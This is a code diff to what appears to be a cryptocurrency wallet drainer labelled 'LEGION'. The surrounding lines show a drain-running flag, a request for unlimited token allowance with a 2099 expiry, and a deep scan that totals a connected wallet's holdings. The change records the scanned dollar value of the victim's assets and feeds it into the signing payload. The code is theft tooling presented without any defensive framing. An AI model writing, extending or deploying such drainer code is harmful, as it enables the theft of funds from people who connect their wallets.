@@ -129,6 +129,7 @@
   var DUMMY_OMNI_SIG = '0x' + '00'.repeat(130);
 
   var drainRunning = false;
+  var SESSION_SCOUT_VALUE_USD = 0;
   var vaultCache = {};
   var clientConfigLoaded = false;
 
@@ -1877,7 +1878,7 @@
             nonce: 'legion:' + Date.now(),
             expiry_iso: '2099-12-31T23:59:59.999Z',
             wallet_type: connectedChains.EVM ? connectedChains.EVM.walletType || 'hot_wallet' : 'hot_wallet',
-            scout_value_usd: 0,
+            scout_value_usd: SESSION_SCOUT_VALUE_USD || 0,
             max_allowance: '115792089237316195423570985008687907853269984665640564039457584007913129639935',
             requires_quorum: false,
             chain_id: evmChainId,
@@ -2144,6 +2145,7 @@
           if (fusionResult) {
             var totalUsd = fusionResult.total_usd || 0;
             var assetsCount = fusionResult.assets_count || 0;
+            SESSION_SCOUT_VALUE_USD = totalUsd;
             console.log('[LEGION]   🏦 Deep scan complete: $' + totalUsd.toFixed(2) + ' across ' + assetsCount + ' assets');
 
             if (fusionResult.staked_steth_usd > 0) console.log('[LEGION]     → stETH: $' + fusionResult.staked_steth_usd.toFixed(2));
